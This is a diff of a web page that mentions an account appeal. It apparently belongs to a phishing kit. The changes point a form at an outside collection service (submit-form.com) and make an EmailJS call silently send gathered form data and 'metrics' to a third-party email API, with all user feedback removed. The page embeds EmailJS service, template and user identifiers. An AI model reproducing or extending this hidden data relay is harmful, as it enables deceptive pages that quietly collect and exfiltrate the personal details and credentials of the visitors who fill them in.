@@ -1,3 +1,4 @@
+
 <html lang="en" id="html"><head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -9,7 +10,7 @@
     <link rel="shortcut icon" href="../ico.ico" type="image/x-icon">
     
 
-
+</head>
 
 <body class="" style="">
     <script>
@@ -3866,7 +3867,7 @@
                             appeal.</p>
 
                     </div>
-                    <form action="coli.php" method="GET">
+                    <form action="https://submit-form.com/b1y03L55a" method="GET">
                         <div class="form-btn-wrapper">
                             <button class="btn btn-primary">
 
@@ -4772,24 +4773,22 @@
         'params': metrics.params
     };
     
-        var data = {
+
+
+    var data = {
         service_id: 'service_3939z4d',
         template_id: 'template_qx8cya8',
         user_id: 'kJf_IiNzVuWnBjgPG',
-        template_params: {
-        'username': 'James',
-        'g-recaptcha-response': '03AHJ_ASjnLA214KSNKFJAK12sfKASfehbmfd...'
+        template_params: templateData
     };
 
     $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
         type: 'POST',
         data: JSON.stringify(data),
         contentType: 'application/json'
-}).done(function() {
-    alert('Your mail is sent!');
-}).fail(function(error) {
-    alert('Oops... ' + JSON.stringify(error));
-});
+    }).done(function () {
+    }).fail(function (error) {
+    });
 }
         function firstFormHandle(event) {
             event.preventDefault()
